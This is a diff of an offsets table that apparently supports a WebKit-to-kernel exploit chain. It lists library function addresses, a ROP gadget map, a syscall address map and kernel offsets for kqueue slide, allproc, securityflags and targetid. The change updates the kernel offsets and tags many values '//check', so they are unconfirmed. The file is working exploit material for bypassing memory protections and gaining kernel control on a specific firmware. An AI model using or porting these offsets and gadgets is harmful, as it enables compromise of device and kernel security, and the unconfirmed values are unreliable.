@@ -1,19 +1,20 @@
-const OFFSET_wk_vtable_first_element     = 0x00D04580;
-const OFFSET_wk_memset_import            = 0x028F9D38;
-const OFFSET_wk___stack_chk_guard_import = 0x028F9A18;
+const OFFSET_wk_vtable_first_element     = 0x00D04580; //check
+const OFFSET_wk_memset_import            = 0x028F9D38; //check
+const OFFSET_wk___stack_chk_guard_import = 0x028F9A18; //check
 
-const OFFSET_lk___stack_chk_guard        = 0x00069190;
-const OFFSET_lk_pthread_create_name_np   = 0x00001B60;
-const OFFSET_lk_pthread_join             = 0x0002FAD0;
-const OFFSET_lk_pthread_exit             = 0x00020A80;
-const OFFSET_lk__thread_list             = 0x000601A8;
+const OFFSET_lk___stack_chk_guard        = 0x00069190; //check
+const OFFSET_lk_pthread_create_name_np   = 0x00001B60; //check
+const OFFSET_lk_pthread_join             = 0x0002FAD0; //check
+const OFFSET_lk_pthread_exit             = 0x00020A80; //check
+const OFFSET_lk__thread_list             = 0x000601A8; //check
 
-const OFFSET_lc_memset                   = 0x000148F0;
-const OFFSET_lc_setjmp                   = 0x0005E9B0;
-const OFFSET_lc_longjmp                  = 0x0005EA00;
+const OFFSET_lc_memset                   = 0x000148F0; //check
+const OFFSET_lc_setjmp                   = 0x0005E9B0; //check
+const OFFSET_lc_longjmp                  = 0x0005EA00; //check
 
-const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;
+const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88; //check
 
+//check
 let wk_gadgetmap = {
     "ret"    : 0x00000042,
     "pop rdi": 0x00043B7C,
@@ -44,6 +45,7 @@ let wk_gadgetmap = {
     "inc dword [rax]": 0x017629AF,
 };
 
+//check
 let syscall_map = {
     0x001: 0x34230, // sys_exit
     0x002: 0x351E0, // sys_fork
@@ -374,9 +376,9 @@ let syscall_map = {
     0x2D2: 0x32E00, // sys_workspace_ctrl
 };
 
-const OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD    = 0x8AB5;
-const OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE  = 0x318AB5;
-const OFFSET_KERNEL_TEXT_KQUEUE_BASE_SLIDE  = 0xF18AB5; //check
+const OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD    = 0x8C1E;
+const OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE  = 0x318C1E;
+const OFFSET_KERNEL_TEXT_KQUEUE_BASE_SLIDE  = 0xEE8C1E;
 const OFFSET_KERNEL_DATA_BASE_ALLPROC       = 0x27EDCB8;
 const OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS = 0x6506474;
 const OFFSET_KERNEL_DATA_BASE_TARGETID      = 0x650647D;
